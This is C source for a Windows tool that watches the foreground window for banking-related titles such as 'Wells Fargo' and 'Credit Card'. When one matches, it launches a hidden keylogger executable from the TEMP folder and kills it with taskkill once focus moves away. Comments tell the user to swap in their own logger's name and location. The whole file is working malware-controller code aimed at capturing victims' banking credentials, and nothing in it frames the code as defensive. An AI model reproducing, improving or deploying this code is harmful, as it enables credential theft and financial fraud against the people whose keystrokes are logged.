#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>

//currently will start up keylogger if window related to banking is detected. Once window relating to banking is closed or out of main focus, keylogger is killed.

TCHAR malpath[MAX_PATH];
TCHAR path[MAX_PATH];

int createpath(LPCTSTR exename, LPCTSTR environmentvar) {
	GetEnvironmentVariable(environmentvar, path, MAX_PATH);
	strcat_s(malpath, strlen(malpath)+strlen(path)+1, path);
	strcat_s(malpath, strlen(malpath)+strlen(exename)+1, exename);
}


DWORD WINAPI startlogger(LPVOID lpParameter){
    	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0}; 
	int cpresult = CreateProcessA(malpath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (cpresult != 0) {
		printf("[+] Keylogger started!\n");
	}
	return 0;
}

void runstartlogger() {
	printf("Creating svarta thread!\n");
	HANDLE hThread = CreateThread(NULL, 0, startlogger, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("Error with creating thread!\n");
	}
	else {
		printf("Bank thread created!\n");
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}

}

void bnk() {
	//printf("[] Checking for banking sites!\n");
	const CHAR * titles[] = {"Wells Fargo", "Credit Card"};
	TCHAR wtitle[MAX_PATH];
	loop:for (int z; z < sizeof(titles)/sizeof(titles[0]); z++) {
		HWND window = GetForegroundWindow();
		GetWindowText(window, wtitle, MAX_PATH);
		int jamfora_3 = strncmp(wtitle, titles[0], strlen(titles[0]));
		if (jamfora_3 != 0) {
			printf("[-] Killing keylogger!\n");
			//change svarta.exe here to name of your executable
			system("taskkill /F /T /IM svarta.exe");
			goto loop;
		}
		else {
			PROCESSENTRY32 entry;
			entry.dwSize= sizeof(PROCESSENTRY32);
			int runcheck;
			HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
			if (Process32First(snapshot, &entry) == TRUE) {
				while (Process32Next(snapshot, &entry) == TRUE) {
					//change name here to name of your executable.
					if (stricmp(entry.szExeFile, "svarta.exe") == 0) {
						runcheck = 1;
					}
				}
				//check if keylogger is already running
				if (runcheck == 1) {
					printf("Svarta is already running!\n");
				}
				else {
					runstartlogger();
				}
				goto loop;
			}
		}
	}

}

int main() {
	//change svarta.exe & TEMP to your executable name & where you stored the logger
	createpath("//svarta.exe", "TEMP");
	while (TRUE) {
		bnk();
	}
}
